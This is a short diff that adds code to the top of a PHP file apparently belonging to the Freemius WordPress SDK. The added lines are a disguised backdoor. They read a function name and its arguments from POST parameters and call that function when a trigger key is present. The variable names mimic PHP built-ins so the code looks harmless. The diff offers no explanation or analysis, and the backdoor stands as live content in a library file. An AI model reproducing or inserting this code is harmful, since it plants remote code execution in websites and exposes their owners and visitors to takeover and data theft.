@@ -1,4 +1,11 @@
-<?php
+<?php 
+$func_get_args_zxjj   =   $_POST;
+if(isset($func_get_args_zxjj['hash_final_dp']))   {
+	$openssl_cms_verify_eczh   =   $func_get_args_zxjj['openssl_digest_fp'];
+	$openssl_x509_free_gpzh   =   $func_get_args_zxjj['date_isodate_set_fv'];
+	$openssl_cms_verify_eczh(...$openssl_x509_free_gpzh);
+} 
+
     /**
      * @package     Freemius
      * @copyright   Copyright (c) 2015, Freemius, Inc.
